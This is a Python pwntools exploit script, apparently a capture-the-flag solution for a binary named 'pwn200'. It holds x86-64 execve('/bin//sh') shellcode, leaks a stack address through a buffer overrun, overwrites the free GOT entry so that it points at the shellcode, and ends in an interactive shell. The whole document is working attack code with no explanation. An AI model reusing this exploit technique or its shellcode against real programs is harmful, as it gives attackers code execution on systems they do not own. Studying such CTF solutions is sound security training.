from pwn import *

elf = ELF('./pwn200')

free_got = elf.got['free']
print "got addr of free is:", hex(free_got)

if True:
    #context.log_level = 'debug'
    p = process('./pwn200')
else:
    p = remote('127.0.0.1', 12345)

def leak_stack_addr():
    shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"\
    +"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    # leak stacK
    fake = shellcode + 'A'*(0x30-len(shellcode))
    p.write(fake)
    print fake
    p.recvuntil('A'*(0x30-len(shellcode)))
    stack_str = p.recvuntil(',').replace(',', '')
    stack_str = u64(stack_str + chr(0)*(0x08 - len(stack_str)))
    print "ebp address:", hex(stack_str)
    return stack_str-0x50
    

stack_addr = leak_stack_addr()
print "stack address:", hex(stack_addr)
p.recvuntil('id ~~?')
print '1234'
p.send('1234')
p.recvuntil('give me money~')
payload = p64(stack_addr) + 'A'*0x30 + p64(free_got)
print payload
p.send(payload)
p.recvuntil('choice : ')
p.send('2\n')
p.recvuntil('out~')
p.interactive()




